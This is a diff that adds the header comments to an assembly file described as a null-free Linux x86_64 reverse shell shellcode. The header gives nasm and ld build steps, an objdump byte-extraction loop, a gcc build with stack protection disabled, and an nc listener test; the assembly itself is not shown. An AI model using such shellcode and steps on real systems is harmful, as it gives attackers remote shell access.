@@ -1,3 +1,30 @@
+
+;Title: Linux/x86_64 - Reverse(0.0.0.0:4444/TCP)Shell(/bin/sh)- Null Free Shellcode
+;Author: Aron Mihaljevic
+;Architecture: Linux x86_64
+;Shellcode Length:  70 bytes
+;github = https://github.com/STARRBOY
+
+;compilation and execution of assembly code
+;-------------------------------------
+;nasm -felf64 reverse.nasm -o reverse.o
+;ld reverse.o -o reverse
+;---------------------------
+;dumping binaries
+;----------------------------------------------------------------------------------
+;for i in $(objdump -d reverse |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+;----------------------------------------------------------------------------------
+;C program 
+;-------------------------------------------------------------------
+;gcc -fno-stack-protector -z execstack reverse_tcp.c -o reverse_tcp
+;----------------------------------------------------------------
+;test:
+;open a terminal and run this " nc -l 0.0.0.0 4444 "
+
+;after you have done that, 
+;open another one and run a shellcode
+
+
 global _start
 
 section .text
